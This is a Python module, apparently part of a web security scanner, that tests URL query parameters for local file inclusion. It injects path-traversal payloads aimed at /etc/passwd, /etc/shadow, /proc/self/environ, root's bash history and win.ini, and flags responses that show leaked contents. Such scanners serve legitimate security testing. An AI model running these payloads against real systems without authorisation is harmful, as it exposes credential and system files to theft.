from ..core.client import fetch
from urllib.parse import urlparse, urlencode, quote
from concurrent.futures import ThreadPoolExecutor, as_completed

PAYLOADS = [
    ("/etc/passwd", "../../../../etc/passwd", "root:"),
    ("/etc/passwd", "../../etc/passwd", "root:"),
    ("/etc/passwd", "....//....//....//etc/passwd", "root:"),
    ("/etc/hosts", "../../../../etc/hosts", "localhost"),
    ("/proc/self/environ", "../../../../proc/self/environ", "HOME="),
    ("c:\\windows\\win.ini", "..\\..\\..\\windows\\win.ini", "fonts"),
    ("/etc/shadow", "../../../../etc/shadow", "root:"),
    ("/root/.bash_history", "../../../../root/.bash_history", "history"),
]


def check_lfi(url):
    findings = []
    if "?" not in url:
        return findings
    parsed = urlparse(url)
    from urllib.parse import parse_qs
    params = parse_qs(parsed.query)
    base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

    def _test(param, file_path, payload, evidence):
        qs = params.copy()
        qs[param] = [payload]
        u = f"{base}?{urlencode(qs, doseq=True)}"
        s, h, b = fetch(u, timeout=8)
        if s and evidence in b:
            findings.append({
                "name": f"LFI: {file_path}",
                "severity": "CRITICAL",
                "url": u,
                "payload": payload,
                "evidence": evidence
            })

    with ThreadPoolExecutor(max_workers=10) as ex:
        for fp, payload, ev in PAYLOADS:
            for p in params:
                ex.submit(_test, p, fp, payload, ev)
    return findings
